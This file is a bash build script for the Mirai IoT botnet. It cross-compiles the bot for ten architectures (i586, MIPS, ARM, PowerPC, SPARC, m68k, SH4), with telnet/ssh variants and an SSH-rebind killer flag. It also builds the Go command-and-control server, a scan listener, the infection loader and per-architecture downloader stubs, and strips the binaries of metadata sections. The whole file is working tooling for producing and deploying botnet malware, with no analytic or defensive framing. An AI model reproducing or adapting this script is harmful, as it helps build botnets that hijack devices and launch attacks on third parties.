#!/bin/bash

FLAGS=""
FLAG_TARGET=""
BUILD_TARGET=""

function compile_bot {
    "$1-gcc" -std=c99 $3 mirai/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o output/"$BUILD_TARGET"/mirai/"$FLAG_TARGET"/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" output/"$BUILD_TARGET"/mirai/"$FLAG_TARGET"/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
        FLAG_TARGET="telnet"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
        FLAG_TARGET="ssh"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
    exit 1
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
    exit 1
elif [ "$1" == "release" ]; then
    BUILD_TARGET="release"

    mkdir output > /dev/null 2>&1
    mkdir output/release > /dev/null 2>&1
    mkdir output/release/mirai > /dev/null 2>&1
    mkdir output/release/mirai/"$FLAG_TARGET" > /dev/null 2>&1
    mkdir output/release/loader > /dev/null 2>&1
    mkdir output/release/loader/bins > /dev/null 2>&1

    rm output/release/mirai/"$FLAG_TARGET"/mirai.* > /dev/null 2>&1
    rm output/release/mirai/"$FLAG_TARGET"/miraint.* > /dev/null 2>&1
    rm output/debug/mirai/cnc > /dev/null 2>&1
    rm output/debug/mirai/scanListen > /dev/null 2>&1
    rm output/release/loader/loader > /dev/null 2>&1
    rm output/release/loader/bins/dlr.* > /dev/null 2>&1

    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sh4 mirai.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

    compile_bot i586 miraint.x86 "-static"
    compile_bot mips miraint.mips "-static"
    compile_bot mipsel miraint.mpsl "-static"
    compile_bot armv4l miraint.arm "-static"
    compile_bot armv5l miraint.arm5n " "
    compile_bot armv6l miraint.arm7 "-static"
    compile_bot powerpc miraint.ppc "-static"
    compile_bot sparc miraint.spc "-static"
    compile_bot m68k miraint.m68k "-static"
    compile_bot sh4 miraint.sh4 "-static"

    go build -o output/release/mirai/cnc mirai/cnc/*.go
    go build -o output/release/mirai/scanListen mirai/tools/scanListen.go

    gcc -static -O3 -lpthread -pthread loader/src/*.c -o output/release/loader/loader
elif [ "$1" == "debug" ]; then
    BUILD_TARGET="debug"

    mkdir output > /dev/null 2>&1
    mkdir output/debug > /dev/null 2>&1
    mkdir output/debug/mirai > /dev/null 2>&1
    mkdir output/release/mirai/"$FLAG_TARGET" > /dev/null 2>&1
    mkdir output/debug/loader > /dev/null 2>&1
    mkdir output/debug/loader/bins > /dev/null 2>&1

    rm output/debug/mirai/"$FLAG_TARGET"/mirai > /dev/null 2>&1
    rm output/debug/mirai/"$FLAG_TARGET"/mirai.* > /dev/null 2>&1
    rm output/debug/mirai/enc > /dev/null 2>&1
    rm output/debug/mirai/nogdb > /dev/null 2>&1
    rm output/debug/mirai/badbot > /dev/null 2>&1
    rm output/debug/mirai/cnc > /dev/null 2>&1
    rm output/debug/mirai/scanListen > /dev/null 2>&1
    rm output/debug/loader/loader > /dev/null 2>&1
    rm output/debug/loader/bins/dlr.* > /dev/null 2>&1

    gcc -std=c99 mirai/bot/*.c -DDEBUG "$FLAGS" -static -g -o output/debug/mirai/"$FLAG_TARGET"/mirai
    mips-gcc -std=c99 -DDEBUG mirai/bot/*.c "$FLAGS" -static -g -o output/debug/mirai/"$FLAG_TARGET"/mirai.mips
    armv4l-gcc -std=c99 -DDEBUG mirai/bot/*.c "$FLAGS" -static -g -o output/debug/mirai/"$FLAG_TARGET"/mirai.arm
    armv6l-gcc -std=c99 -DDEBUG mirai/bot/*.c "$FLAGS" -static -g -o output/debug/mirai/"$FLAG_TARGET"/mirai.arm7
    sh4-gcc -std=c99 -DDEBUG mirai/bot/*.c "$FLAGS" -static -g -o output/debug/mirai/"$FLAG_TARGET"/mirai.sh4
    gcc -std=c99 mirai/tools/enc.c -g -o output/debug/mirai/enc
    gcc -std=c99 mirai/tools/nogdb.c -g -o output/debug/mirai/nogdb
    gcc -std=c99 mirai/tools/badbot.c -g -o output/debug/mirai/badbot
    go build -o output/debug/mirai/cnc mirai/cnc/*.go
    go build -o output/debug/mirai/scanListen mirai/tools/scanListen.go

    gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 loader/src/*.c -o output/debug/loader/loader
else
    echo "Unknown parameter $1: $0 <debug | release>"
    exit 1
fi

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.arm
armv6l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.arm7
i686-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.mips
#mips64-gcc -Os -D BOT_ARCH=\"mps64\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.mps64
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.sh4
#sh2elf-gcc -Os -D BOT_ARCH=\"sh2el\" -D SH2EL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.sh2el
#sh2eb-gcc -Os -D BOT_ARCH=\"sh2eb\" -D SH2EB -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.sh2eb
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static loader/dlr/main.c -o output/"$BUILD_TARGET"/loader/bins/dlr.spc

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.arm
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.arm7
i686-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr output/"$BUILD_TARGET"/loader/bins/dlr.spc
